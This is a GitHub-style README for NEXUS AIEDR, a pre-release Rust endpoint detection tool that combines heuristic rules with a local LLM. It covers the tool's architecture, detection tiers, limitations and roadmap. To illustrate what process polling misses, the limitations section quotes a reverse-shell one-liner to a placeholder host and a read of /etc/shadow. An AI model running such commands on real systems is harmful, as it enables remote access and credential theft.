<div align="center">

# 🛡️ NEXUS AIEDR

**AI-powered Endpoint Detection & Response, engineered for air-gapped environments.**

[![Status](https://img.shields.io/badge/status-pre--release-orange)]()
[![Rust](https://img.shields.io/badge/rust-1.95+-93450a)]()
[![License](https://img.shields.io/badge/license-Proprietary-red)]()
[![Detection Rules](https://img.shields.io/badge/detection_rules-100-blue)]()
[![Tests](https://img.shields.io/badge/tests-96_passing-green)]()
[![MITRE Coverage](https://img.shields.io/badge/MITRE_ATT%26CK-60%2B_techniques-purple)]()
[![Tiers](https://img.shields.io/badge/commercial_tiers-4-orange)]()

*Heuristic precision meets local LLM reasoning — zero cloud dependencies, full data sovereignty.*

</div>

---

## 🎯 What is NEXUS?

NEXUS is a next-generation **EDR/XDR platform** written in Rust that combines two detection engines in a unique cascading architecture:

1. **Deterministic heuristic rules** — sub-millisecond detection of known attack patterns (100 curated rules across 4 commercial tiers, 60+ MITRE ATT&CK techniques)
2. **Local AI reasoning** — Gemma 4 LLM running entirely on-premise for zero-day detection, false-positive triage, and contextual threat naming

**No cloud. No telemetry leaks. No vendor lock-in.** Designed for environments where data sovereignty is non-negotiable: financial institutions, defense, healthcare, critical infrastructure, and regulated EU markets (GDPR, NIS2, eIDAS).

---

## 🚀 Why NEXUS?

| Problem | Traditional EDR | NEXUS |
|---------|-----------------|-------|
| Zero-day detection | Cloud ML — telemetry leaves the perimeter | Local LLM — bytes never leave the perimeter |
| False-positive fatigue | Threshold tuning hell | AI-enriched verdicts with reasoning |
| Air-gapped environments | Not supported / degraded mode | First-class citizen |
| Vendor lock-in | $50–200 per endpoint per year SaaS | Self-hosted, source-available |
| GDPR / NIS2 compliance | Requires DPIA + DPA per region | Compliant by architecture |

---

## ⚡ Key Differentiators

- 🧠 **Cascading Oracle** — Heuristic primary (1 ms deterministic) + LocalOracle/Gemma 4 secondary for ambiguous events. Verdicts are intelligently merged, never ping-ponged.
- 🔒 **100% Local Inference** — Gemma 4 E4B Q8 runs via embedded `llama.cpp` HTTP server. No outbound API calls. Verifiable with `tcpdump`.
- 🎯 **Adaptive Response Ladder** — 5-level severity (`LOG → ALERT → THROTTLE → KILL → ISOLATE`), proportional to confidence × score.
- 🔗 **Per-host Correlation Engine** — Sliding windows with bounded memory, lock-free concurrent absorption, idle-host eviction.
- 🛡️ **Graceful Degradation** — If the AI server is unreachable, NEXUS falls back to heuristic-only mode without service interruption.
- 💼 **Tier-aware Knowledge Base** — Single-binary, feature-flagged commercial tiers (Free / Pro / Business / Enterprise) following the GitLab/Elastic licensing model.
- 📡 **Future-ready P2P mesh** — `nexus-hive` will let peer agents share IoCs over Ed25519-signed beacons (no central management server required).

---

## 🏗️ Architecture
┌─────────────────────────────────────────────────────────────┐
│                      NEXUS Agent (per-host)                 │
│                                                             │
│   ProcessMonitor (sysinfo, eBPF in M10)                     │
│        │                                                    │
│        ▼                                                    │
│   CorrelationEngine (per-host sliding windows)              │
│        │                                                    │
│        ▼                                                    │
│   ╔══════════════════════════════════════╗                  │
│   ║       CascadingOracle                ║                  │
│   ║                                      ║                  │
│   ║   ┌──────────────────────────────┐   ║                  │
│   ║   │ HeuristicOracle              │   ║                  │
│   ║   │ deterministic, 100 rules     │◄──╫── KnowledgeBase  │
│   ║   │ tier-aware filtering         │   ║   (signed feeds, │
│   ║   │ ~1 ms verdict latency        │   ║    tier-aware)   │
│   ║   └──────────┬───────────────────┘   ║                  │
│   ║              │ if score in [0.3,0.7] ║                  │
│   ║              ▼                       ║                  │
│   ║   ┌──────────────────────────────┐   ║                  │
│   ║   │ LocalOracle / Gemma 4 E4B    │   ║                  │
│   ║   │ zero-day + enrichment        │◄──╫── llama.cpp HTTP │
│   ║   │ ~7–15 s verdict latency      │   ║   :8080          │
│   ║   └──────────────────────────────┘   ║                  │
│   ╚══════════════════════════════════════╝                  │
│        │                                                    │
│        ▼                                                    │
│   ResponseEngine (5-level adaptive ladder)                  │
│        │                                                    │
│        ▼                                                    │
│   Audit log (structured ECS-compliant tracing)              │
└─────────────────────────────────────────────────────────────┘
│
│  (future)
▼
┌────────────────────┐
│   nexus-hive P2P   │
│  Ed25519-signed    │
│   IoC propagation  │
└────────────────────┘

---

## 🚦 Project Status

> **NEXUS source code is currently in a private pre-release repository.**
> Public source release is planned **as soon as the project reaches production-ready quality**.

This repository hosts the **public-facing documentation** — architecture, detection coverage,
and roadmap — for transparency with the security community while the project matures.

### What you can see today

- ✅ Full architecture and design rationale
- ✅ Complete list of 100 detection rules with MITRE mappings
- ✅ Tier-aware commercial model
- ✅ Threat intelligence references (CVEs, APT campaigns)
- ✅ Roadmap and milestone history
- ✅ Tech stack and performance metrics
- ✅ Honest documentation of current limitations

### What is not yet public

- 🔒 Source code (`nexus-core`, `nexus-agent`, `nexus-hive` crates)
- 🔒 Pre-built binaries
- 🔒 Detection rule definitions in machine-readable format

### Interested in early access?

If you represent a security team, research lab, or organization with a use case that aligns with NEXUS (air-gapped EDR, sovereign cloud, regulated industry), reach out via the [Contact](#-contact) section below.

---

## 🎯 Detection Coverage

NEXUS ships with **100 curated detection rules**, classified into 4 commercial tiers (Free / Pro / Business / Enterprise). Every rule includes:

- ✅ A unique `NEX-*` identifier for tracking and tuning
- ✅ A MITRE ATT&CK technique mapping (60+ unique techniques covered)
- ✅ A tier classification (commercial licensing readiness)
- ✅ A target OS classification
- ✅ A maturity tag (`stable` / `beta`) reflecting field validation
- ✅ An author tag for accountability

### Tier Distribution

| Tier | Count | Coverage | Example Categories |
|------|------:|----------|--------------------|
| 🆓 **Free** (Community) | 54 | Common malware, ransomware, scripting attacks | Reverse shells (Bash/Python/Perl/Ruby/PHP/Node), base64 payloads, cryptominers, mass file rename, history clearing, hidden home executables, shell expansion abuse |
| 🥉 **Pro** | 21 | Supply chain, advanced detection, evasion patterns | CanisterWorm suite (npm postinstall, ICP canister C2, self-propagation), PwnKit (CVE-2021-4034), LD_PRELOAD/LD_LIBRARY_PATH hijacking, memfd_create fileless, SSH backdoors, Tor C2, /proc memory dump |
| 🥈 **Business** | 16 | Server, container, cloud security | Web/DB/mail server RCE (Log4Shell, Spring4Shell), runc container escape (CVE-2024-21626), K8s pod escape, Docker socket abuse, cloud IMDS access (169.254), cgroup release_agent, K8s service account theft |
| 🥇 **Enterprise** | 9 | APT-tier, kernel-level, advanced rootkits | DirtyPipe, OverlayFS exploits, log tampering, MAC disable (AppArmor/SELinux), bind-mount rootkit (Symbiote pattern), ptrace process injection, LOLBin chains, APT timestomping (touch -t) |
| **Total** | **100** | | |

### Threat Intelligence References

Rules are not invented — every detection is backed by published research, CVEs, or documented APT campaigns:

- **CVE references**: CVE-2021-4034 (PwnKit), CVE-2022-0847 (DirtyPipe), CVE-2023-2640 (OverlayFS), CVE-2024-21626 (runc), CVE-2024-4577 (PHP-CGI), CVE-2019-10149 (Exim), CVE-2021-44228 (Log4Shell), CVE-2022-22965 (Spring4Shell)
- **Threat actors**: TeamPCP, Outlaw, Kinsing, TeamTNT, RotaJakiro, XorDDoS, APT29, Turla, APT41, Lazarus, Symbiote
- **Campaigns**: CanisterWorm (JFrog/Socket/Aikido, 2026), GlassWorm, Shai-Hulud
- **Frameworks**: MITRE ATT&CK v15, GTFOBins, PayloadsAllTheThings, CIS Docker Benchmark, OWASP Container Security

---

## 🔬 Detection Methodology

NEXUS v0.3 uses **sysinfo-based process polling at 10 Hz** to capture process telemetry. This approach is portable (no kernel module required) and works on standard Linux/WSL2 hosts without elevated capabilities, making it ideal for rapid development and broad compatibility.

### Strengths

- Portable across distributions (no kernel-version dependency)
- Works in containers and WSL2 without privileged access
- Stable and well-tested (`sysinfo` is widely adopted in the Rust ecosystem)
- Sub-second detection on long-running processes (cryptominers, persistent shells, web shells)

### Known Limitations

Polling-based capture has architectural trade-offs that NEXUS acknowledges transparently:

- **Processes living less than ~100 ms may be missed.** A `cat /etc/shadow` that completes in 5 ms can fall between two polling intervals.
- **The captured `command_line` reflects the post-`execve()` state.** When a shell launches a child via `fork()` + `execve()`, the resulting process inherits the executed binary's name and arguments, not the original shell expression. For example, `bash -c "sleep 5"` is observed as `sleep 5` after `execve` replaces the bash image.
- **Bash redirections do not appear in `/proc/<pid>/cmdline`.** Patterns like `bash -i >& /dev/tcp/host/port 0>&1` are partially obscured at the procfs layer.

These limitations are inherent to userspace process polling. They are addressed in the next milestone.

### Milestone 10 — eBPF Kernel Telemetry (in progress)

The roadmap includes migrating telemetry capture to **eBPF** using the [`aya`](https://github.com/aya-rs/aya) crate. eBPF intercepts `execve()` syscalls **before** the exec replaces the process image, capturing:

- Original command line as invoked by the parent shell (with all arguments and redirections context)
- Parent process ID and command line (for chain-of-trust analysis)
- Sub-millisecond detection latency (no polling interval)
- Syscall-level visibility (`connect`, `openat`, `clone`, `ptrace`, etc.)

This will bring NEXUS detection capabilities in line with industry-standard EDR tools (Falco, CrowdStrike Falcon Linux sensor, Sysdig Secure) which all rely on eBPF for high-fidelity telemetry on Linux.

### Why ship with polling first?

NEXUS v0.1–v0.3 prioritized **architecture validation** (Cascading Oracle, AI integration, tier system) over telemetry source perfection. The polling approach demonstrated end-to-end that the core ideas work on a real system: heuristic + AI cascading verdicts, zero false positives during 60-second idle tests, stable AI inference under load. eBPF integration is the natural next step now that the architecture is proven.

---

## 🆚 NEXUS vs Existing Solutions

| Capability | Wazuh | Falco | CrowdStrike Falcon | **NEXUS** |
|-----------|:-----:|:-----:|:-----:|:-----:|
| Open / source-available | ✅ | ✅ | ❌ | ✅ |
| Local AI reasoning | ❌ | ❌ | Cloud only | ✅ |
| Air-gapped operation | ⚠️ | ✅ | ❌ | ✅ |
| Deterministic rules | ✅ (2000+ OSSEC) | ✅ (~50) | ✅ | ✅ (100 curated) |
| Per-rule MITRE mapping | Partial | Partial | ✅ | ✅ |
| Cascading verdict (heuristic + AI) | ❌ | ❌ | ❌ | ✅ |
| Commercial tier classification | ❌ | ❌ | Implicit | ✅ |
| eBPF telemetry | ❌ (planned) | ✅ | ✅ | 🚧 (Milestone 10) |
| P2P mesh telemetry | ❌ | ❌ | ❌ | 🚧 (Milestone 11) |
| Cost per endpoint per year | Free | Free | $50–200 | TBD |
| Memory-safe language | C / Python | Go / C++ | C++ | **Rust** |

---

## 🛣️ Milestone History

A transparent log of development progress.

### ✅ Milestone 1 — Foundations
- Workspace skeleton (`nexus-core`, `nexus-agent`, `nexus-hive`)
- ECS-compliant event schema (`EcsEvent`, `EventBuilder`)
- Ed25519 signed envelope (`crypto.rs`) for trustworthy KB updates
- Initial 5-rule detection set (Windows-only)

### ✅ Milestone 2 — Heuristic Oracle
- `Oracle` trait abstraction (async, generic verdict format)
- `HeuristicOracle` implementation: deterministic, sub-millisecond
- `KnowledgeBase` with versioning and IoC categorization
- 13 detection rules (3 Windows + 10 Linux core)

### ✅ Milestone 3 — Process Telemetry
- `ProcessMonitor` via `sysinfo` polling (10 Hz default)
- ECS conversion (`ProcessInfo` → `EcsEvent`)
- Live event production tested on Linux + WSL2

### ✅ Milestone 4 — Correlation Engine
- Per-host sliding windows with bounded memory
- Lock-free concurrent absorption
- Idle-host eviction (configurable TTL)
- 14 unit tests covering eviction, suppression, race conditions

### ✅ Milestone 5 — Adaptive Response Engine
- 5-level severity ladder: `LOG → ALERT → THROTTLE → KILL → ISOLATE`
- Dry-run mode for safe staging
- Audit-grade structured logging via `tracing`

### ✅ Milestone 6 — LocalOracle / Gemma 4 Integration
- HTTP client to embedded `llama.cpp` server
- JSON schema-constrained generation (deterministic structure)
- Verdict normalization (clamp scores, MITRE validation)
- Live-tested on AMD Ryzen 9 / 32 GB RAM, no GPU

### ✅ Milestone 7 — Cascading Oracle Architecture
- Two-stage verdict pipeline: heuristic primary + LocalOracle secondary
- Confidence-weighted score merging (0.6 primary / 0.4 secondary)
- Graceful fallback if LLM server unreachable
- Full audit trail of both verdicts in single ECS record

### ✅ Milestone 8 — Detection Coverage Expansion
- Detection KB grown 6x: from 13 to 78 rules
- 5 strategic families added: CanisterWorm Suite, Initial Access, Persistence, Privilege Escalation, Credential Access, Lateral Movement
- 50+ unique MITRE ATT&CK techniques covered
- Real-world threat intel references for every rule
- LocalOracle bug fix: empty-reasoning fallback for benign events

### ✅ Milestone 9 — Tier-Aware Knowledge Base
- **KB grown from 78 to 100 detection rules** (+22 new Linux rules)
- 4 commercial tiers introduced: Free / Pro / Business / Enterprise
- New `RuleTier` and `RuleOs` enums with backward-compatible serde defaults
- Runtime filtering via `KnowledgeBase::filter_by_tier()` and `filter_active_rules()`
- Single-binary feature-flagged licensing model (GitLab/Elastic-style)
- 7 new unit tests for tier-aware filtering (87 unit tests total, all passing)
- Production-ready: zero false positives in 60-second idle test
- Categories added: Kubernetes pod escape, Docker socket abuse, cloud IMDS access, APT timestomping, ptrace injection, LOLBin chains, memfd_create fileless, bind-mount rootkit

### 🚧 Milestone 10 — eBPF Kernel Telemetry *(in progress)*
- Replace polling-based `sysinfo` with eBPF (`aya` crate)
- Capture `execve()` syscalls pre-exec for full command-line visibility
- Sub-millisecond detection latency
- Syscall-level visibility: `execve`, `connect`, `openat`, `clone`, `ptrace`
- Industry parity with Falco / CrowdStrike Falcon Linux sensor

### 🔜 Milestone 11 — P2P Hive Mesh *(planned)*
- mDNS peer discovery on local network
- Ed25519-signed beacon broadcast for IoC propagation
- Quorum-based KB updates without central server
- Will become the unique commercial differentiator vs Wazuh / Falco

### 🔜 Milestone 12 — License Enforcement *(planned)*
- Ed25519-signed license key file (offline-capable, air-gapped friendly)
- Runtime tier validation: agent loads only rules at or below licensed tier
- Grace period for expired licenses (downgrade to Free, no service interruption)
- Foundation for commercial Pro / Business / Enterprise sales

### 🔜 Milestone 13 — Windows-Native Agent *(planned)*
- ETW event consumer
- Windows service installer (MSI)
- Native PowerShell / WMI / DCOM detection rules

### 🔜 Milestone 14 — Management UI *(planned)*
- Web-based dashboard (Leptos / Yew)
- KB editor with rule-as-code workflow
- Forensic timeline viewer

---

## 🛠️ Tech Stack

| Layer | Technology | Why |
|-------|-----------|-----|
| Language | **Rust 1.95+** | Memory safety, performance, zero-cost abstractions |
| Async runtime | Tokio | De-facto standard for async Rust |
| LLM | **Gemma 4 E4B Q8_0** (4B params) | Best tradeoff between local-runnable size and reasoning quality |
| LLM serving | `llama.cpp` HTTP server | Mature, CPU-friendly, OpenAI-compatible API |
| Process telemetry | `sysinfo` (cross-platform) | Pure Rust, no kernel dependencies — eBPF planned for Milestone 10 |
| Crypto | `ring` (AES-256-GCM, Ed25519) | Audited, BoringSSL-backed |
| Schema | Elastic Common Schema 8.11 | Industry-standard interoperability |
| Logging | `tracing` (structured) | Production-grade observability |
| Serialization | `serde` + `serde_json` | Standard Rust ecosystem |

---

## 📋 Current Status

🚧 **Pre-release v0.3 — Milestone 9 complete**

| Metric | Value |
|--------|-------|
| Detection rules | **100** |
| Commercial tiers | **4** (Free / Pro / Business / Enterprise) |
| MITRE techniques covered | **60+** |
| Test coverage | **96 tests passing** (87 unit + 9 integration, including 7 tier-filter tests) |
| Codebase size | ~7,400 lines of Rust |
| Supported OS | Linux (Ubuntu 22.04+, WSL2 verified). Windows planned (Milestone 13) |
| Detection latency (heuristic) | < 1 ms |
| Detection latency (LocalOracle, CPU) | 7–15 s on Ryzen 9 3900XT |
| Memory footprint (agent) | ~30 MB without LLM |
| Memory footprint (LLM) | ~11 GB (Gemma 4 E4B Q8) |
| Idle false positives (60s test) | **0** |

---

## 📬 Contact

For early-access evaluation, threat intelligence collaboration, or commercial licensing inquiries:

- 🔗 **GitHub**: [@nexus-aiedr](https://github.com/nexus-aiedr)
- 💼 **LinkedIn**: *coming soon*
- 📧 **Email**: *coming soon*

> Currently building solo from Italy 🇮🇹. Responses may take 1–3 business days.

---

## 📜 License

**Proprietary. All rights reserved.**

NEXUS will transition to a dual-license model (AGPLv3 + commercial) upon public release. Until then, all source code is provided for evaluation only and may not be redistributed.

---

## ⚠️ Disclaimer

NEXUS is **pre-release software** under active development. Detection rules are validated against published threat intelligence, but no detection system can guarantee 100% coverage of unknown threats. Use in production environments at your own risk and always pair with defense-in-depth practices.

---

<div align="center">

**Built in Rust. Engineered for sovereignty. Designed for the AI era.**

🇮🇹 Made with care in Italy

</div>
